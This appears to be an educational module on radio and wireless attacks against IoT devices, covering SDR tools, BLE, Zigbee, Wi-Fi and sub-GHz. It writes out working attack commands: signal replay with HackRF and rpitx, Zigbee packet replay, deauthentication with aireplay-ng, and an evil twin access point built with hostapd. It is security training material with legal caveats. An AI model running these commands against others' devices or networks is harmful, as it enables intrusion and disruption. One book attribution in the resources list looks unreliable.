---
title: "Radio & Wireless Attacks"
order: 7
level: Advanced
description: "Software-defined radio, BLE exploitation, and wireless protocol attacks"
estimated_time: "120 minutes"
prerequisites:
  - "Module 2: Networking for IoT"
  - "Module 6: Hardware Hacking"
related_labs:
  - "lab-ble-sniffing"
---

# Module 7: Radio & Wireless Attacks

## Introduction

Most IoT devices communicate wirelessly. Whether it is Wi-Fi, Bluetooth Low Energy (BLE), Zigbee, Z-Wave, LoRa, or proprietary sub-GHz protocols, these wireless links represent a significant attack surface. An attacker within radio range can eavesdrop on communications, inject malicious data, replay captured transmissions, or jam signals to cause denial of service.

This module introduces the fundamentals of radio frequency (RF) security testing, the tools used to capture and analyze wireless signals, and attack techniques for the most common IoT wireless protocols.

---

## Radio Frequency Basics

### Key Concepts

| Term             | Definition                                                       |
|------------------|------------------------------------------------------------------|
| Frequency        | Number of wave cycles per second, measured in Hertz (Hz)         |
| Wavelength       | Physical length of one wave cycle                                |
| Bandwidth        | Range of frequencies a signal occupies                           |
| Modulation       | How data is encoded onto a carrier wave (AM, FM, ASK, FSK, etc.)|
| Antenna gain     | How effectively an antenna focuses energy in a direction (dBi)   |
| Signal strength  | Received power level, measured in dBm                            |

### Common IoT Frequency Bands

| Protocol       | Frequency Band        | Range           | Data Rate         |
|----------------|-----------------------|-----------------|-------------------|
| Wi-Fi          | 2.4 GHz / 5 GHz / 6 GHz | ~50-100m     | Up to Gbps        |
| Bluetooth / BLE| 2.4 GHz               | ~10-100m       | 1-2 Mbps          |
| Zigbee         | 2.4 GHz (also 868/915 MHz) | ~10-100m  | 250 kbps          |
| Z-Wave         | 868 MHz (EU) / 908 MHz (US) | ~30-100m  | 100 kbps          |
| LoRa           | 433 / 868 / 915 MHz   | 2-15 km         | 0.3-50 kbps       |
| Sub-GHz (generic) | 315 / 433 / 868 MHz | ~50-200m       | Varies             |
| Thread         | 2.4 GHz               | ~10-30m        | 250 kbps          |
| Matter         | Various (uses Thread, Wi-Fi, BLE) | Varies | Varies        |

### Legal Considerations

**Important:** Transmitting on radio frequencies is regulated by law in every country. Before transmitting (even for testing), ensure you:

- Have explicit authorization to test the target devices.
- Comply with your country's radio regulations (FCC in the US, ETSI in Europe, etc.).
- Use shielded enclosures (Faraday cages) when possible to limit your transmission range.
- Keep transmission power to the minimum necessary.
- Never jam or interfere with emergency, aviation, or licensed radio services.

---

## SDR Hardware

Software-Defined Radio (SDR) replaces traditional hardware radio components with software, allowing a single device to receive (and sometimes transmit) across a wide range of frequencies.

### Popular SDR Devices

| Device         | Freq Range         | TX Capable | Bandwidth  | Approx. Cost |
|----------------|--------------------|------------|------------|---------------|
| RTL-SDR v3     | 24 MHz - 1.7 GHz  | No         | ~2.4 MHz   | $25 - $35     |
| HackRF One     | 1 MHz - 6 GHz     | Yes        | 20 MHz     | $300 - $350   |
| YARD Stick One | Sub-1 GHz          | Yes        | N/A        | $100 - $120   |
| Ubertooth One  | 2.4 GHz (BT only) | Yes        | N/A        | $120 - $150   |
| PlutoSDR       | 325 MHz - 3.8 GHz | Yes        | 20 MHz     | $150 - $200   |
| bladeRF 2.0    | 47 MHz - 6 GHz    | Yes        | 56 MHz     | $420 - $900   |
| LimeSDR        | 100 kHz - 3.8 GHz | Yes        | 61.44 MHz  | $300 - $500   |

### Getting Started with RTL-SDR

The RTL-SDR is the best entry point for radio security research. It is receive-only, inexpensive, and widely supported.

```bash
# Install RTL-SDR drivers and tools on Linux
sudo apt-get install rtl-sdr librtlsdr-dev

# Test that the device is recognized
rtl_test -t

# Receive and record FM radio as a basic test (listen to a local FM station)
rtl_fm -f 101.1M -M wbfm -s 200000 -r 48000 - | aplay -r 48000 -f S16_LE

# Record raw IQ data at a specific frequency
rtl_sdr -f 433920000 -s 2048000 -g 40 capture.iq
```

---

## GNURadio Introduction

GNURadio is an open-source toolkit for signal processing. It provides a graphical interface (GNURadio Companion) for building signal processing flowgraphs.

### Installing GNURadio

```bash
# Install on Ubuntu/Debian
sudo apt-get install gnuradio gnuradio-dev gr-osmosdr

# Launch GNURadio Companion (GUI)
gnuradio-companion
```

### Basic GNURadio Flowgraph for Receiving

A simple flowgraph to receive and visualize a signal:

```
[osmocom Source] -> [Low Pass Filter] -> [QT GUI Frequency Sink]
                                      -> [QT GUI Waterfall Sink]
```

**Key GNURadio blocks for IoT research:**

| Block                  | Purpose                                          |
|------------------------|--------------------------------------------------|
| osmocom Source         | Receives data from RTL-SDR, HackRF, etc.         |
| Frequency Xlating FIR  | Tunes to a specific frequency offset             |
| Low Pass Filter        | Removes out-of-band noise                        |
| Clock Recovery MM      | Recovers the symbol timing from a digital signal |
| Binary Slicer          | Converts analog symbols to digital bits          |
| File Sink              | Saves data to a file for offline analysis        |
| QT GUI sinks           | Real-time visualization (spectrum, waterfall)    |

---

## Capturing and Analyzing Wireless Signals

### General Workflow

1. **Identify the frequency** -- check FCC filings for the device (search by FCC ID on fcc.gov), consult the device datasheet, or do a wideband scan.
2. **Capture the signal** -- use an SDR to record raw IQ data while the device transmits.
3. **Analyze the signal** -- examine the capture in a spectrum analyzer or GNURadio to determine modulation type, data rate, and encoding.
4. **Decode the data** -- build a decoder (in GNURadio or with custom code) to extract the payload.
5. **Look for vulnerabilities** -- check for lack of encryption, static codes, replay susceptibility.

### Using Universal Radio Hacker (URH)

URH is an excellent tool for analyzing unknown digital radio protocols.

```bash
# Install URH
pip install urh

# Launch the GUI
urh
```

URH workflow:

1. **Record** -- capture the signal from an SDR.
2. **Interpret** -- URH auto-detects modulation (ASK, FSK, PSK) and bit encoding.
3. **Analyze** -- view decoded bits, identify preamble, sync word, and payload.
4. **Generate** -- create and transmit modified signals (if you have a TX-capable SDR).

---

## Replay Attacks

Many IoT devices use simple wireless protocols without rolling codes or encryption. Garage door openers, car key fobs (older ones), wireless doorbells, and some alarm systems are vulnerable to replay attacks.

### Basic Replay Attack with RTL-SDR and HackRF

```bash
# Step 1: Record the signal with RTL-SDR (receive only)
rtl_sdr -f 433920000 -s 2048000 -g 40 -n 4096000 doorbell_signal.iq

# Step 2: Replay the signal with HackRF (requires TX capability)
hackrf_transfer -t doorbell_signal.iq -f 433920000 -s 2048000 -a 1 -x 30

# Using rpitx on a Raspberry Pi (transmit via GPIO -- very low power)
# Convert the IQ file and transmit on the target frequency
rpitx -m IQ -i doorbell_signal.iq -f 433920
```

### Replay Attack Countermeasures

| Countermeasure      | Description                                              |
|---------------------|----------------------------------------------------------|
| Rolling codes       | Each transmission uses a different code from a sequence  |
| Challenge-response  | Device must respond to a random challenge from receiver  |
| Timestamps          | Messages include timestamps; old messages are rejected   |
| Encryption          | Payload is encrypted; replay has no meaningful effect    |
| Sequence numbers    | Receiver tracks sequence; old numbers are rejected       |

---

## BLE Sniffing and GATT Enumeration

Bluetooth Low Energy (BLE) is ubiquitous in IoT -- fitness trackers, smart locks, medical devices, beacons, and more.

### BLE Architecture Overview

```
+------------------+
|   Application    |   <-- Device-specific logic
+------------------+
|      GATT        |   <-- Services and Characteristics
+------------------+
|      ATT         |   <-- Attribute Protocol
+------------------+
|      L2CAP       |   <-- Logical Link Control
+------------------+
|   Link Layer     |   <-- Advertising, connections
+------------------+
|   Physical       |   <-- 2.4 GHz radio, 40 channels
+------------------+
```

### Scanning for BLE Devices

```bash
# Using hcitool (Linux built-in)
sudo hcitool lescan

# Using bluetoothctl
bluetoothctl
> scan on

# Using bettercap (more powerful)
sudo bettercap
> ble.recon on

# Output example:
# AA:BB:CC:DD:EE:FF  SmartLock-Pro
# 11:22:33:44:55:66  FitBand-3000
# 77:88:99:AA:BB:CC  TempSensor
```

### GATT Enumeration

The Generic Attribute Profile (GATT) defines how BLE devices expose their data as services and characteristics.

```bash
# Using gatttool to enumerate services and characteristics
gatttool -b AA:BB:CC:DD:EE:FF --primary
# Lists all primary services with their UUIDs

gatttool -b AA:BB:CC:DD:EE:FF --characteristics
# Lists all characteristics

# Read a specific characteristic
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x0025

# Write to a characteristic
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0025 -n 0100

# Interactive mode
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary
> characteristics
> char-read-hnd 0x0025
```

### Common BLE Vulnerabilities

| Vulnerability          | Description                                         |
|------------------------|-----------------------------------------------------|
| No pairing / Just Works | Device accepts connections without authentication  |
| Static passkeys        | Hardcoded pairing PINs (e.g., 000000 or 123456)    |
| Unencrypted GATT       | Characteristics readable/writable without pairing  |
| Sensitive data in ads  | Device broadcasts private data in advertising packets|
| MITM in legacy pairing | BLE 4.0/4.1 legacy pairing is vulnerable to MITM   |
| Replay on write chars  | Writing captured values to characteristics          |

### BLE Sniffing with Ubertooth

```bash
# Capture BLE advertising packets
ubertooth-btle -f -c capture.pcap

# Follow a specific connection (need to capture the connection setup)
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF -c connection.pcap

# Open the capture in Wireshark for analysis
wireshark capture.pcap
# Use the "btle" display filter
```

### BLE Sniffing with nRF Sniffer

Nordic Semiconductor's nRF Sniffer (using an nRF52840 dongle) integrates directly with Wireshark.

```bash
# Flash the nRF52840 dongle with the sniffer firmware
# (follow Nordic's nRF Sniffer for Bluetooth LE guide)

# Launch Wireshark -- the nRF Sniffer appears as a capture interface
# Select the target device's address to follow its connections
```

---

## Zigbee Security and Attacks

Zigbee is widely used in home automation (smart lights, sensors, door locks). It uses the IEEE 802.15.4 standard at the physical layer.

### Zigbee Security Model

Zigbee uses AES-128 encryption with several key types:

| Key Type       | Purpose                                       |
|----------------|-----------------------------------------------|
| Network Key    | Encrypts all traffic within the Zigbee network |
| Link Key       | Encrypts traffic between two specific devices  |
| Install Code   | Pre-shared key for secure initial joining      |
| Trust Center Link Key | Default key for joining (often well-known) |

**The classic Zigbee vulnerability:** Many networks use the default Trust Center Link Key (`ZigBeeAlliance09`), and the network key is transmitted encrypted with this well-known key during device joining. An attacker who captures the join process can decrypt the network key.

### Zigbee Sniffing with KillerBee

```bash
# Install KillerBee (requires compatible hardware like RZUSBSTICK or ApiMote)
pip install killerbee

# Scan for Zigbee networks
zbstumbler

# Capture Zigbee packets
zbdump -f 15 -c zigbee_capture.pcap
# -f 15 = channel 15 (Zigbee uses channels 11-26 in the 2.4 GHz band)

# Replay a captured packet
zbreplay -f 15 -r zigbee_capture.pcap

# Attempt to extract the network key during a device join
zbwireshark  # analyze captures in Wireshark with Zigbee dissectors
```

### Forcing a Rejoin

If the network key was not captured during initial setup, an attacker can sometimes force a device to rejoin the network by sending a spoofed disassociation frame, then capturing the rejoin exchange to obtain the network key.

---

## Wi-Fi Attacks Relevant to IoT

Many IoT devices rely on Wi-Fi for connectivity and are particularly vulnerable because they often lack the security features of general-purpose computers.

### IoT-Specific Wi-Fi Concerns

- **Provisioning attacks** -- Many IoT devices create an open AP during setup. Credentials are sent in plaintext.
- **Deauthentication attacks** -- IoT devices may not handle deauth gracefully, causing them to disconnect and potentially expose data during reconnection.
- **Evil twin attacks** -- IoT devices that auto-connect to known SSIDs can be tricked into connecting to a rogue access point.
- **Weak credentials** -- Devices may use predictable Wi-Fi passwords or store network credentials insecurely.

### Deauthentication Attack

```bash
# Put your Wi-Fi adapter into monitor mode
sudo airmon-ng start wlan0

# Identify target devices
sudo airodump-ng wlan0mon

# Send deauthentication frames to a specific IoT device
# (Target the device MAC and the AP MAC)
sudo aireplay-ng -0 10 -a [AP_BSSID] -c [DEVICE_MAC] wlan0mon

# This disconnects the device. Monitor what happens:
# - Does it reconnect automatically?
# - Does it fall back to an open configuration AP?
# - Does it send credentials in plaintext during reconnection?
```

### Evil Twin for IoT Provisioning

```bash
# Create a fake AP mimicking the IoT device's setup network
# Many IoT devices create APs named like "SmartDevice-XXXX"

# Using hostapd to create a rogue AP
cat > /tmp/hostapd.conf << 'HOSTAPD'
interface=wlan1
driver=nl80211
ssid=SmartDevice-A1B2
channel=6
hw_mode=g
HOSTAPD

sudo hostapd /tmp/hostapd.conf

# Run a DHCP server and capture the provisioning traffic
sudo dnsmasq -i wlan1 --dhcp-range=192.168.4.100,192.168.4.200,12h -d
```

---

## Sub-GHz Protocols (433 MHz, 868 MHz)

Many IoT devices -- particularly in home automation, automotive, and industrial settings -- use sub-GHz frequencies for their longer range and better penetration through walls.

### Common Sub-GHz Applications

| Application           | Typical Frequency | Protocol/Modulation  |
|-----------------------|-------------------|----------------------|
| Garage door openers   | 315 / 390 MHz     | OOK / rolling code   |
| Car key fobs          | 315 / 433 MHz     | OOK / rolling code   |
| Weather stations      | 433 MHz           | OOK / ASK            |
| Wireless doorbells    | 433 MHz           | OOK                  |
| Smart home sensors    | 433 / 868 MHz     | FSK / OOK            |
| LoRa sensors          | 868 / 915 MHz     | CSS (Chirp Spread)   |
| TPMS (tire pressure)  | 315 / 433 MHz     | FSK / ASK            |

### Analyzing Sub-GHz Signals

```bash
# Use rtl_433 to automatically decode many common 433 MHz protocols
# rtl_433 supports hundreds of device protocols out of the box
sudo apt install rtl-433
rtl_433

# Output example:
# time      : 2026-03-30 14:22:33
# model     : Acurite-Tower  id: 2845
# channel   : A              temperature_C: 22.300
# humidity  : 45             battery_ok: 1

# Record raw signal data for later analysis
rtl_433 -S all  # saves all detected signals to files

# Analyze a specific frequency
rtl_433 -f 868000000  # listen on 868 MHz
```

---

## Using Flipper Zero and Similar Tools

The Flipper Zero is a portable multi-tool designed for security research. It integrates sub-GHz radio, NFC, RFID, infrared, and GPIO capabilities in a single device.

### Flipper Zero Capabilities for IoT Security

| Feature        | Capability                                           |
|----------------|------------------------------------------------------|
| Sub-GHz radio  | Receive and transmit 300-928 MHz; read, save, replay |
| NFC            | Read, emulate, and write NFC tags (NTAG, Mifare)    |
| 125 kHz RFID   | Read and emulate low-frequency RFID cards            |
| Infrared       | Learn and replay IR remote signals                    |
| GPIO           | Interface with UART, SPI, I2C, iButton               |
| BadUSB         | Act as a USB keyboard to inject keystrokes           |
| Bluetooth      | BLE scanning and some BLE attacks (with firmware)    |

### Sub-GHz Analysis with Flipper Zero

```
1. Navigate to Sub-GHz -> Read on the Flipper Zero
2. Trigger the target device (press the garage remote, doorbell, etc.)
3. Flipper captures and decodes the signal
4. Supported protocols are decoded automatically (Princeton, KeeLoq,
   Nice FLO, CAME, Linear, etc.)
5. Captured signals can be saved and replayed

For raw (unsupported) protocols:
1. Sub-GHz -> Read RAW
2. Capture the raw signal
3. Save and replay it
```

### Ethical Use

The Flipper Zero and similar tools are designed for authorized security research and education. Using them to attack systems you do not own or have authorization to test is illegal in most jurisdictions.

---

## Practical Exercises

### Exercise 1: FM Radio Reception

Basic SDR familiarization:

1. Connect an RTL-SDR to your computer.
2. Open GQRX or SDR++ and tune to a local FM radio station.
3. Observe the spectrum and waterfall display.
4. Identify the signal bandwidth and modulation type.

### Exercise 2: 433 MHz Signal Analysis

1. Run `rtl_433` and observe signals from nearby devices (weather stations, car key fobs passing by, etc.).
2. Identify the protocol, modulation, and data fields for each detected signal.
3. Consider what security implications exist for each detected device.

### Exercise 3: BLE Scanning and Enumeration

1. Use `bluetoothctl` or `bettercap` to scan for BLE devices in your vicinity.
2. Select a device you own (a fitness tracker, smart bulb, etc.).
3. Enumerate its GATT services and characteristics.
4. Read accessible characteristics and identify what data is exposed.
5. Determine whether the device requires pairing or encrypts its data.

---

## Summary

Wireless protocols are a critical attack surface in IoT. Key takeaways from this module:

- **SDR tools** like RTL-SDR and HackRF allow you to receive and transmit across a wide range of frequencies, enabling analysis of virtually any wireless protocol.
- **BLE** is widespread but frequently misconfigured -- devices often expose sensitive data through unprotected GATT characteristics.
- **Zigbee** has known weaknesses in its key exchange process that can expose network encryption keys.
- **Sub-GHz protocols** used by many consumer IoT devices often lack encryption entirely and are vulnerable to replay attacks.
- **Wi-Fi** attacks like deauthentication and evil twin are particularly effective against IoT devices that lack robust reconnection logic.
- **Always operate within legal boundaries** -- obtain authorization before testing and comply with radio regulations.

---

## Additional Resources

- [RTL-SDR Blog](https://www.rtl-sdr.com/)
- [GNURadio Wiki](https://wiki.gnuradio.org/)
- [Universal Radio Hacker (URH)](https://github.com/jopohl/urh)
- [KillerBee Framework](https://github.com/riverloopsec/killerbee)
- [Bluetooth SIG GATT Specifications](https://www.bluetooth.com/specifications/gatt/)
- [rtl_433 Project](https://github.com/merbanan/rtl_433)
- Mike Ossmann, *Software Defined Radio with HackRF* (Great Scott Gadgets)
- Aditya Gupta, *The IoT Hacker's Handbook* (wireless chapters)
- Carle Alonso, *Practical IoT Hacking* (O'Reilly)
